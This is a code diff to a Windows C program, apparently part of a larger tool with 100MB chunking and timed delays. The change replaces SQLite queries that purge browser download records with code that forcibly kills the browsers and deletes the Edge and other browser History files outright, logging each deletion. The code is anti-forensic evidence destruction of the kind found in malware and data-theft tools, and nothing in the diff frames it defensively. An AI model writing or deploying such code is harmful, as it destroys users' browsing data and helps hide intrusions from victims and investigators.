@@ -3,7 +3,7 @@
 #include <string.h>
 #include <windows.h>
 #include <shlobj.h>
-#include <sqlite3.h>
+#include <tlhelp32.h>
 
 #define CHUNK_SIZE (100 * 1024 * 1024)  // 100MB chunks
 #define DELAY_MS (2 * 60 * 1000)        // 2 minutes in milliseconds
@@ -41,11 +41,7 @@ void KillBrowsers() {
     CloseHandle(snapshot);
 }
 
-// Clear browser download history using SQLite
-int ClearBrowserDownloadHistoryCallback(void *data, int argc, char **argv, char **azColName) {
-    return 0; // SQLite callback stub
-}
-
+// Clear browser download history by deleting history files
 void ClearBrowserDownloadHistory() {
     char *browserPaths[] = {
         "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History",
@@ -55,26 +51,15 @@ void ClearBrowserDownloadHistory() {
         NULL
     };
     char expandedPath[MAX_PATH];
-    sqlite3 *db;
-    char *errMsg = 0;
 
     KillBrowsers(); // Ensure browsers are closed to avoid file locks
 
     for (int i = 0; browserPaths[i]; i++) {
         ExpandEnvironmentStrings(browserPaths[i], expandedPath, MAX_PATH);
-        if (sqlite3_open(expandedPath, &db) == SQLITE_OK) {
-            const char *sql = (i == 3) ? // Firefox uses places.sqlite
-                "DELETE FROM moz_places WHERE url LIKE '%downloads%'; DELETE FROM moz_historyvisits;"
-                : "DELETE FROM downloads; DELETE FROM downloads_url_chains;";
-            if (sqlite3_exec(db, sql, ClearBrowserDownloadHistoryCallback, 0, &errMsg) == SQLITE_OK) {
-                LogActivity("Cleared download history for browser");
-            } else {
-                LogActivity(errMsg);
-            }
-            sqlite3_free(errMsg);
-            sqlite3_close(db);
+        if (DeleteFile(expandedPath)) {
+            LogActivity("Deleted browser history file");
         } else {
-            LogActivity("Failed to open browser database");
+            LogActivity("Failed to delete browser history file");
         }
     }
 }
